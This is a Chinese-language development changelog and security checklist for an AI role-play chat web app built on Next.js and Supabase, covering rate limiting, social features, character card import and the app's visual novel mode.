- [x] 限流：Postgres 函数 `consume_rate_limit`（固定窗口，`rate_limits` 表）+ 内存兜底；chat 30/min、summary 6/min、diary 6/min、连接测试 12/min；body ≤ 20k 字、`max_tokens` 由预设决定（≤ 65536）
- [x] `next.config` headers：CSP（script 仅 self + inline、connect 仅 self + Supabase、frame-src self/blob、frame-ancestors none）、HSTS（生产）、nosniff、X-Frame-Options DENY、Referrer-Policy、Permissions-Policy
- [x] 日志：`lib/log.ts`，生产只打 level ≥ warn；`src` 里已无 `console.log`（测试除外）
- [x] 错误边界（`error.tsx` / `global-error.tsx` / `not-found.tsx`）+ toast（sonner，`AppToaster`）统一
- [x] 测试：vitest 116 个用例，覆盖 assemble / presets（含主流角色扮演前端导入）/ macros / tokens / sanitizeCss / regexScripts / 真实皮肤样本 / SSRF guards / 连接头编码 / 角色卡解析 / 记忆表格式化（Playwright 冒烟未做：需要测试账号，留 backlog）
- [x] favicon.svg / icon-base.svg / manifest 换新色，8 个 PNG 图标 + apple-touch-icon + favicon.ico 已从新 SVG 重新生成
- [~] 性能：消息按 40 条分页懒加载（虚拟化留 backlog）、字体走 `next/font`、`prefers-reduced-transparency` / `prefers-reduced-motion` 降级已在 tokens.css
- [x] 旧代码 / SQL / 笔记归档到 git tag `v1-archive`，`docs/legacy-*` 已删；README 重写
- [ ] **需要你手动执行**：Supabase SQL editor 跑 `supabase/migrations/0006_rate_limits.sql`（`rate_limits` 表 + `consume_rate_limit` 函数）。不跑也能用（内存兜底），但多实例部署时限流不准
- 验收：`tsc` / `eslint` / `next build` / 116 测试全绿 ✅；旧 `x-api-key` 兼容层已删；`@types/node` 升到 22 后 `npm install` 不再需要 `--legacy-peer-deps`；浏览器响应头能看到 CSP、连续快速发 31 条消息会收到 429 —— **待你实测**

### 迭代 4（2026-10-22）
- [x] Vercel 构建修复：lockfile 补齐 Linux 平台二进制，`.npmrc` 固定 legacy-peer-deps
- [x] 注册邮箱验证流程（`/auth/callback`）、找回密码（`/auth/reset`）
- [x] 社交：聊天页右侧评论区（楼中楼、作者标识、作者可删），`character_stats` 公开聚合统计 + 触发器，探索 / 角色页 / 作者页 / 「我的」页统计（0011）
- [x] 修评论区「发出去没反应」：线上库缺 `character_comments.images` 列（v1 的脚本没跑过），列表查询 400 但插入成功；0011 补列 + `hotfix/comments_images_column.sql`，评论区加载 / 发布 / 回复失败都显示真实错误并可重试
- [x] 收藏：`character_favorites`（0012，owner-only RLS，私人）；探索卡片 / 角色页书签按钮，`/explore/favorites` 收藏夹（探索页分区切换 + 「我的」入口），撤回的角色自动隐藏并计数
- [x] 分享链接：角色页「分享」（桌面复制链接，触屏走系统分享面板）；`/character/public/*` 登出可访问（proxy 放行），`generateMetadata` 给链接预览标题 / 简介 / 头像，根布局补 `metadataBase`
- [x] 评论点赞：`character_comments.likes_count` + `comment_likes`，`toggle_comment_like` RPC（0013），评论项心形按钮，乐观更新
- [x] 站内通知：`notifications` 表（owner-only RLS，只由触发器写入）；`notify_on_comment` 触发器：回复 → 被回复者，新评论 / 回复 → 角色作者；`/settings/notifications` 收件箱（打开即标已读，可删）；导航「我的」未读角标（60s 轮询 + 聚焦刷新）
- [x] 评论定位：通知链接带 `?comment=<id>`，角色页加载完评论后滚动到那条并高亮 3 秒；每条评论有 `#comment-<id>` 锚点；评论已删则提示
- [x] 评论排序：最新 / 最热（赞数 → 回复数 → 时间），楼中楼保持时间序
- [x] 副本联动（0014）：`characters.source_character_id` / `source_published_at`，复制时写入；副本的聊天页显示原角色的评论区（原角色撤回发布则隐藏）；公开页已有副本时按钮变「去我的副本」
- [x] 作者更新：发布对话框加「更新说明」（`release_note`）；`notify_on_character_publish` 触发器通知复制过的人（带 `payload.copy_id`）和收藏的人；副本的聊天页 / 角色主页出现「作者更新了这个角色」横幅，更新前二次确认（覆盖名字 / 头像 / 人设 / 皮肤 / 世界书，对话与记忆不动），聊天页可「暂不更新」按版本记住
- [x] 沉浸式聊天：`settings.background.useAvatar`（默认开）→ 没有自定义背景时用头像当背景，对话流 0.5 透明 + 16px 模糊，视觉小说铺满；`settings.layout: flow | novel`，顶栏一键切换 + 会话设置里的分段控件
- [x] 视觉小说模式：`VisualNovelStage`（底部对话框：名牌、用户上一句、最新回复流式打字、框内滚动 / 展开、swipe / 重新生成 / 续写、内嵌 Composer），顶栏浮动悬停显示（触屏点舞台切换），完整消息列表放进右侧「对话记录」抽屉；皮肤新增 `#cv_vn_*` 与 `data-layout` / `data-source` 钩子
- [x] AI 回复里的 HTML 默认渲染（`skin.renderHtml` 默认 true，皮肤里可关）；之前保存过皮肤的角色若存了 false 需在皮肤设置里手动打开
- [x] 去掉「复制到我的角色」（版权）：删除 fork 与副本升级链路，0015 删 `source_*` 列；重新发布的通知改发给聊过的人 + 收藏的人（`notify_on_character_publish`），玩家的聊天页出现一次性「作者更新了这个角色」说明条（新快照自动生效，按版本记在本机）
- [x] 「我的角色」分栏：我创作的 / 我聊过的（别人的角色按对话聚合，继续 / 新对话）；`/characters/[id]` 对非作者变成「我和它的对话」页（只读快照信息、我的对话、导入记录、去公开页）
- [x] 角色卡导入正则：通用卡 `extensions.regex_scripts` → `skin.regexScripts`（替换文本含 HTML 的脚本自动 `renderAsHtml`，输出进沙箱），导出也写回 `extensions.regex_scripts`
- [x] 角色卡编辑页重做：文档式一页滚动（左侧锚点栏跟随滚动，手机横向 tabs），字段对齐通用卡（描述 / 性格 / 场景 / 开场白 + 备选 / 对话示例 / 系统提示 / 后置指令 / 用户人设 / 补充设定 / 世界书 / 皮肤 / 发布），存储格式不变（`form/types.ts` 做映射，含旧卡兼容）；每个长文本框带字数 / token 估算和宏插入
- [x] 右侧预览 dock（xl+ 常驻，小屏抽屉）：「模型会看到什么」用真正的 `assemble()` + 所选预设拼出每个块与 token 数，并指出预设忽略了卡里哪些部分；「试聊」走新路由 `/api/chat/preview`，对未保存草稿直接聊，不落库
- [x] 正则测试台 + 模板：`lib/skins/regexTest.ts`（按顺序累计应用、命中区间、无效正则不抛错），每条脚本下方的测试台显示命中数 / 高亮 / 这一步之后的文本；「从模板添加」（状态栏、隐藏思考过程、去掉 OOC 括号、对白加粗），加模板时自动把示例文本拼进测试用回复
- [ ] 下一步候选：CSS 旋钮、视觉小说模式的打字机节奏
- [ ] 待修：直接删除 auth 用户会 500（有表的 `user_id` 外键没有 `on delete cascade`，清掉 `chat_sessions` 后才能删）；做「注销账号」前先补一遍级联

### 迭代 3（2026-10-21）
- [x] 角色卡导入导出：`lib/cards`（PNG tEXt 块读写、通用卡 v1/v2/v3 ↔ 我们的格式，`extensions.charaverse` 无损往返）；导出 JSON / PNG 卡，导入 JSON / PNG 含世界书与头像
- [x] 聊天记录导入导出：`lib/chatlog`（JSON 无损、通用 JSONL、Markdown）；聊天页导出，角色主页导入成新对话
- [x] 角色卡新增「对话示例」字段，喂给预设的 `dialogueExamples` 占位
- [x] 摘要任务 prompt 可编辑（`/settings/tasks`）；日记功能移除

### 迭代 2（2026-10-21）
- [x] 全部界面 / 文档 / 注释去掉第三方前端与第三方作者的名字；第三方美化卡样本从仓库移除，测试改用自写样本
- [x] 多开场白：角色卡 `basic_info.alternateGreetings[]`，开新对话时第一条消息可左右切换
- [x] 世界书：`lib/lorebook`（schema、通用 world-info JSON 导入、关键词 / 常驻 / 次级关键词 / 概率 / 扫描深度 / 预算）；角色内嵌世界书（`characters.lorebook`，随发布快照一起走）+ 用户世界书库（`lorebooks` 表，启用即应用到全部对话）；注入到预设的 `worldInfoBefore / After` 占位；`0008_lorebooks.sql`
- [x] 摘要 / 记忆提取的任务 prompt 做成可编辑：`lib/tasks/summary.ts`（默认值 + 占位符渲染），`user_task_prompts` 表（0009），`/settings/tasks` 页（system / 模板 / 风格范例 / 采样，可恢复默认）；日记功能整体移除（0010）

### 迭代 1（2026-10-21，P6 之后）
- [x] 角色主页 `/characters/[id]`：该角色的全部对话（分支缩进显示「分支自 #id」）、继续最近 / 开新对话 / 重命名 / 删除；「对话」页改为按角色分组，角色卡片点进主页，聊天 header 加「切换 / 管理对话」
- [x] 删除模板库（页面、导航、TemplateManager、`prompt_templates` 相关代码；`0007_drop_templates.sql` 可选执行删表）—— 通用格式预设已覆盖这个需求
- [x] 聊天气泡长行不换行：加 `overflow-wrap: anywhere`
- [x] 会话级采样覆盖（temperature / top_p / max_tokens，默认跟随预设）+「流式输出」开关

### Backlog（不排期）
- API key 加密同步（多设备）
- 世界书 / lorebook（`ContextManager` 已留参数）
- 语音 / 图片消息、贴纸（如果真要，重新设计，不恢复旧代码）
- 评论系统恢复（走 RLS 直连，不要 API 路由）
- 关注作者 / 分享海报（`src/migrate.md` 的建议）

**明确不做**：手机 App / PWA / IM 式手机聊天（A13）、多角色剧本模式（A15）

---

## 7. 安全 & AI infra 检查表（每个 phase 结束过一遍）

- [ ] 所有 `/api/*` 第一行是 `getUser()`；资源访问带 `user_id` 过滤 + RLS 双保险
- [ ] 不信任输入：`baseUrl` 校验、`model` 白名单正则、body 大小、JSON schema（zod）
- [ ] 用户 key：不进 DB、不进日志、不进 URL、不进 Cache Storage、不进错误信息
- [ ] 作者内容：CSS 过 parser 清洗 + 作用域；HTML/JS 只在 sandboxed iframe；markdown 图片/链接 allowlist
- [ ] Prompt 边界：角色卡、用户人设、记忆、摘要各自用明确分隔符包裹；记忆写回前校验
- [ ] 费用：每用户限流、`max_tokens` 上限、超时、流式中断可取消
- [ ] 隐私：公开 = 快照；RLS 覆盖每张表（含新表）；storage owner-only；点赞/计数走 RPC
- [ ] 依赖：`npm audit` 无 critical/high；锁版本
- [ ] 头部：CSP / HSTS / frame / referrer；SW 不缓存 API
- [ ] 日志只有 level + 请求 id，无内容

---

## 8. 已拍板的决定（2026-10-20）

1. **A1** Next 16（失败兜底 15.5.x）✅
2. **A2** 去 Redux，换 Zustand + TanStack Query ✅
3. **A13** 手机方向（PWA / App / IM 式手机聊天）不做，只保持响应式 ✅
4. **A15** 多角色彻底删除 ✅
5. **A16** 新增预设系统（§5.6）✅
6. 贴纸两套都删；日记保留；模板库页暂留（P4 视情况并进角色编辑器）
7. 配色：Warm Glass，accent 暂用 sienna，可随时改 token
